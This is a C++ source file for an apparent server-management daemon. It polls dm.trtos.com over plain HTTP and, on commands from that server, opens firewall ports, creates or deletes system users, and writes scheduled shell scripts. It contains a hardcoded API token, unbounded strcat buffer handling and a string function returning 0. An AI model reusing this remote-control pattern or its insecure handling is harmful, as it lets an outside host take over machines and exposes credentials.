#include <iostream>
#include <string>
#include <vector>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <cstdlib>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h> 
#include "square.h"
#include "appconfig.h"
#include "shell.h"
#include "ini.h"
#include "log.h"
#include "spdlog/spdlog.h"
#include "spdlog/sinks/basic_file_sink.h"
#include <fstream>

using namespace std;

#define DEST_PORT 80
#define DEST_IP_BY_NAME "dm.trtos.com"
#define GET_KEY "POST http://dm.trtos.com/php/value.php?name=servertool_key HTTP/1.1\r\n"
#define SET_KEY "POST http://dm.trtos.com/php/value.php?name=servertool_key&value=454545 HTTP/1.1\r\n";
#define SET_MAC "POST http://dm.trtos.com/php/value.php?name=servertool_mac&value=55:34:33:33:33 HTTP/1.1\r\n";
#define CHECKSH "/etc/servertool/check.sh"


string http_get(int fd,string text) {
int send_num;
    char send_buf [] = "helloworld";
    char recv_buf [4096];
    char str1[4096];
    string res;
    while (1) {
        spdlog::info("begin send\n");
        memset(str1,0,4096);
        strcat(str1, text.c_str());
        strcat(str1,"Host: dm.trtos.com\r\n");
        strcat(str1,"Content-Length: 65\r\n");
        strcat(str1,"Content-Type: application/x-www-form-urlencoded\r\n");
        strcat(str1,"\r\n");
        strcat(str1,"mathod=adb_signe&token=0E1FEECD0EE54E3B8568A536A7036D78B1AC7EEE");
        strcat(str1,"\r\n\r\n");
        I("str1 = {}\n",str1);
        send_num = send(fd, str1,strlen(str1),0);
        if (send_num < 0) {
            spdlog::error("send error");
            exit(1);
        } else {
            I("{}:send successful\n",__FILE__);
            I("begin recv:\n");
            int recv_num = recv(fd,recv_buf,sizeof(recv_buf),0);
            if(recv_num < 0) {
                E("recv fail!");
                exit(1);
            } else {
                I("recv sucess:{}\n",recv_buf);
                res=recv_buf;
            }
        }
        break;
        sleep(5);
    }
    close(fd);
    return res;
}

int connect_ip(string ip)
{
    int sock_fd;
    struct sockaddr_in addr_serv;
    sock_fd=socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0)
    {
       E("sock error");
       exit(1);
    }
    memset(&addr_serv, 0, sizeof(addr_serv));
    addr_serv.sin_family = AF_INET;
    addr_serv.sin_port = htons(DEST_PORT);
    I("Ip address={}",ip.c_str());
    in_addr_t addr=inet_addr(ip.c_str());
    memcpy(&addr_serv.sin_addr, &(addr), sizeof(addr));
    if (connect(sock_fd, (struct sockaddr*)(&addr_serv), sizeof(addr_serv)) < 0)
    {
        E("connect error\n");
        return -1;
    }
    return sock_fd;
}
string http_getkey(string get)
{
    int fd=connect_ip(ap_serverip);
    if(fd==-1)return "";
    string str=http_get(fd,get);
    I("start={},end={}\r\n",(int)str.find("["),(int)str.find("]"));
    str = str.substr(str.find("[")+1 ,str.find("]")-str.find("[")-1);
    return str;
}
void http_sendmac()
{
    char str1[512];
    int fd=connect_ip(ap_serverip);
    if(fd==-1)return;
    memset(str1,0,512);
    strcat(str1, "POST http://dm.trtos.com/php/value.php?name=servertool_mac&value=");
    strcat(str1, ap_mac.c_str());
    strcat(str1, " HTTP/1.1\r\n");
    string r=http_getkey(str1);
    if(ap_debug)std::cout <<r << std::endl;
}

string appgetipbyname(string name)
{
    struct addrinfo *ai, *aip;
    struct addrinfo hint;
    struct sockaddr_in *sinp;
    const char *addr;
    int err;
    char buf[1024];
    hint.ai_flags = AI_CANONNAME;
    hint.ai_family = 0;
    hint.ai_socktype = 0;
    hint.ai_protocol = 0;
    hint.ai_addrlen = 0;
    hint.ai_canonname = NULL;
    hint.ai_addr = NULL;
    hint.ai_next = NULL;
    if((err = getaddrinfo(DEST_IP_BY_NAME, NULL, &hint, &ai)) != 0)E("ERROR: getaddrinfo error: {}\n", gai_strerror(err));
    for(aip = ai; aip != NULL; aip = aip->ai_next)
    {
        I("Canonical Name: {}\n", aip->ai_canonname);
        if(aip->ai_family == AF_INET)
        {
            sinp = (struct sockaddr_in *)aip->ai_addr;
            addr = inet_ntop(AF_INET, &sinp->sin_addr, buf, sizeof buf);
            return addr;
        }
    }
    return 0;
}
void cmd_export(string r)
{
    r=encryption(r);
    W("strcmp={}",strcmp(r.c_str(),ap_key.c_str()));
    if(strcmp(r.c_str(),ap_key.c_str())!=0)
    {
        printf("REVICE kEY:%s\r\n",r.c_str());
        I("CONTEXT:{}",r);
        string po1=get_url_value(r,"po1");
        string po2=get_url_value(r,"po2");
        string po3=get_url_value(r,"po3");
        string data=get_url_value(r,"data");
        string un=get_url_value(r,"un");
        string pw=get_url_value(r,"pw");
        string path=get_url_value(r,"path");
        string pf1=get_url_value(r,"pf1");
        string pf2=get_url_value(r,"pf2");
        string pf3=get_url_value(r,"pf3");
        string allp=po1+" "+po2+" "+po3;
        allowport(allp);//允许端口
        string delp=pf1+" "+pf2+" "+pf3;//这次关闭的端口
	//如果date参数等于系统当前参数则立即执行删除用户
        string curr_date="/bin/date +%Y%m%d";
        string cdate=getshell(curr_date);
        //去除"\n"
        cdate=cdate.replace(cdate.find("\n"),string("\n").length(),"");
        int sdate=atoi(cdate.c_str());
        int indate=atoi(data.c_str());
	//int compare=cdate.compare(data);
	if(indate<=sdate){
            string res=deleteUser(un,path);
            I(res);
	}else{
        if(data.size()>1)set_key_value("check.sh","data",data.c_str());
        if(un.size()>1)set_key_value("check.sh","un",un.c_str());
        if(pw.size()>1)set_key_value("check.sh","pw",pw.c_str());
        if(path.size()>1)set_key_value("check.sh","path",path.c_str());
	}
	//如果客户端不是第一次运行则跳到skipwriteshell
        if(un.size()==0||pw.size()==0||path.size()==0){
		fstream checksh_file;
		checksh_file.open(CHECKSH,ios::in);
		if(!checksh_file){
			goto skipwriteshell;
		}
	}	
        if(data.size()>1&&indate>sdate)
        {
            string res=write_shell(allp);//计划任务删除端口
            I(res);
        }
	skipwriteshell: 
        if(delp.size()>1)
        {
             string res=deleteport(delp);//删除端口操作
             I(res);
        }
        if(un.size()>1&&indate>sdate)
        {
            string res=createuser(un);//创建用户
            I(res);
        }
        ap_key=r;
    }
}
void http_thread()
{
    ap_serverip=appgetipbyname(ap_serverurl);
    ap_mac=getmac();
    I("local eth0 address:{}",ap_mac);
    http_sendmac();
    while(true)
    {
        string r=http_getkey(GET_KEY);
        I("KEY:{}",r);
        cmd_export(r);
        sleep(3);
    }
}


